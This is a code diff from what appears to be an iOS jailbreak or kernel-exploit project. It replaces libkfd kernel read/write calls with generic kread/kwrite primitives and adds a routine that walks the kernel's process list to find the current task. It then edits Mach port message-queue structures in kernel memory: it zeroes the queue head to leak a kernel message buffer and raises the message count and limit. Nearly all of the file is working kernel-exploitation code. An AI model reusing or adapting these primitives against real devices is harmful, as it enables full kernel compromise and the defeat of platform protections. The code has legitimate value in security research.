@@ -8,10 +8,24 @@
 #import <Foundation/Foundation.h>
 #include <unistd.h>
 #include <mach/mach.h>
-#include "libkfd.h"
 #include "IOSurface_primitives.h"
+#include "boot_info.h"
+#include "pplrw.h"
 int message_size_for_kalloc_size(int kalloc_size) {
 	return ((3*kalloc_size)/4) - 0x74;
+}
+uint64_t getProc_thing(pid_t pid) {
+    uint64_t proc = bootInfo_getUInt64(@"kernel_proc");
+    while(true) {
+        if(kread32(proc + 0x60) == pid) {
+            return proc;
+        }
+        proc = kread64(proc + 0x8);
+        if(!proc) {
+            return -1;
+        }
+    }
+    return 0;
 }
 void *kalloc_msg(uint64_t size) {
 	NSLog(@"Kalloc called with size: %p",size);
@@ -51,14 +65,16 @@ void *kalloc_msg(uint64_t size) {
 	}
 	NSLog(@"Getting current task.");
 	usleep(1500);
-	uint64_t pr_task = get_current_task();
+	uint64_t proc = getProc_thing(getpid());
+    uint64_t proc_ro = kread64(proc + 0x18);
+    uint64_t pr_task = kread64(proc_ro + 0x8);
 	// sleep(2);
-	uint64_t itk_space_pac = kread64_kfd(pr_task + 0x300);
+	uint64_t itk_space_pac = kread64(pr_task + 0x300);
 	uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
 	NSLog(@"itk_space: %p",itk_space);
 	// sleep(2);
 	uint32_t port_index = MACH_PORT_INDEX(port);
-	uint32_t table_size = kread32_kfd(itk_space + 0x14);
+	uint32_t table_size = kread32(itk_space + 0x14);
 	NSLog(@"[i] table_size: 0x%x, port_index: 0x%x\n", table_size, port_index);
 	// sleep(2);
 		if (port_index >= table_size) {
@@ -71,33 +87,33 @@ void *kalloc_msg(uint64_t size) {
 	uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
 	NSLog(@"entry: %p",entry);
 	// sleep(2);
-	uint64_t object_pac = kread64_kfd(entry);
+	uint64_t object_pac = kread64(entry);
 	uint64_t object = object_pac | 0xffffff8000000000;
 	uint64_t port_kaddr = object;
 	NSLog(@"object: %p",object);
 	// sleep(2);
 		// find the message buffer:
-		UInt64 mqueue = kread64_ptr_kfd(port_kaddr + 0x20); // ipc_port.ip_messages
+		UInt64 mqueue = kread_ptr(port_kaddr + 0x20); // ipc_port.ip_messages
 		NSLog(@"mqueue: %p",mqueue);
 	// sleep(2);
-		UInt64 circlequeue = kread64_ptr_kfd(mqueue + 0x0); // ipc_mqueue.imq_messages
+		UInt64 circlequeue = kread_ptr(mqueue + 0x0); // ipc_mqueue.imq_messages
 	NSLog(@"circlequeue: %p",circlequeue);
 	// sleep(2);
-		UInt64 head = kread64_ptr_kfd(circlequeue + 0x0); // circle_queue_head.head
+		UInt64 head = kread_ptr(circlequeue + 0x0); // circle_queue_head.head
 	NSLog(@"head: %p",head);
 	// sleep(2);
-		uint64_t message_buffer = kread64_ptr_kfd(head - 0x0); // first element of the circle queue __container_of which would be a pointer to an ipc_kmsg (hopefully) aka our kernel message buffer
+		uint64_t message_buffer = kread_ptr(head - 0x0); // first element of the circle queue __container_of which would be a pointer to an ipc_kmsg (hopefully) aka our kernel message buffer
 		NSLog(@"message buffer: %llx\n", message_buffer);
 	// sleep(2);
 		// leak the message buffer:
-	kwrite64_kfd(head, 0);
+	kwrite64(head, 0);
 	UInt64 imq_msgcountoff = mqueue + sizeof(mach_port_seqno_t) + sizeof(mach_port_name_t);
-	uint16_t imq_msgcount = kread16_kfd(imq_msgcountoff);
+	uint16_t imq_msgcount = kread16(imq_msgcountoff);
 	NSLog(@"imq_msgcount: %d",imq_msgcount);
-	kwrite16_kfd(imq_msgcountoff, imq_msgcount+1);
+	kwrite16(imq_msgcountoff, imq_msgcount+1);
 	UInt64 imq_qlimitoff = imq_msgcountoff + sizeof(uint16_t);
-	uint16_t imq_qlimit = kread16_kfd(imq_qlimitoff);
+	uint16_t imq_qlimit = kread16(imq_qlimitoff);
 	NSLog(@"imq_qlimit: %d",imq_qlimit);
-	kwrite16_kfd(imq_qlimitoff,imq_qlimit+1);
+	kwrite16(imq_qlimitoff,imq_qlimit+1);
 	return message_buffer; // now pray this works.
 }
